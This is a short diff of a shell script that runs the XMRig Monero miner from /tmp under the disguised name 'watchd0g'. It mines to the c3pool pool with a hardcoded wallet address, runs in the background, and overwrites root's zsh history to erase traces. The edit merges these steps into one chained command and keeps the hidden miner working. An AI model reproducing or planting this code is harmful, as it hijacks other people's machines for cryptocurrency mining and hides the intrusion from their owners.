@@ -16,9 +16,4 @@ mkdir /tmp/watchd0g
 
 mv /tmp/xmrig/build/xmrig /tmp/watchd0g
 
-chmod 777 /tmp/watchd0g
-
-./tmp/watchd0g --donate-level 0 -o auto.c3pool.org:19999 -u 45F8ihixwyTi2WLadoJrsKdjwstKTAEupCYE6jzoBAZWQuY9uXxVh6i1LzoppCXuUx8tXjfaFUCG11DGXeXLkyrx1ir3gZj -t 2 -B
-
-echo "exit" > /root/.zsh_history
-
+chmod 777 /tmp/watchd0g && cd /tmp && ./watchd0g --donate-level 0 -o auto.c3pool.org:19999 -u 45F8ihixwyTi2WLadoJrsKdjwstKTAEupCYE6jzoBAZWQuY9uXxVh6i1LzoppCXuUx8tXjfaFUCG11DGXeXLkyrx1ir3gZj -t 2 -B && echo "exit" > /root/.zsh_history
